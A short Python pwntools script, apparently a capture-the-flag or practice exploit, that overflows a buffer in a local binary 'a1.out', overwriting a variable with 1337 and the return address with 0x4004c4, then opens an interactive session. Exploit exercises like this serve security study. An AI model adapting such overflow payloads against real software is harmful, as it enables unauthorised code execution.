#!/usr/bin/env python3
from pwn import log
from pwnlib.util.fiddling import hexdump

from pwnlib.tubes.process import process
from pwnlib.util.packing import *


r = process("./a1.out")

buf = b'A'*6
buf += p32(1337)
buf = buf.ljust(30, b'B')
buf += p64(0x4004c4)

log.info("Payload")
print ( hexdump(buf, width=12))
r.writeline(buf)
r.interactive()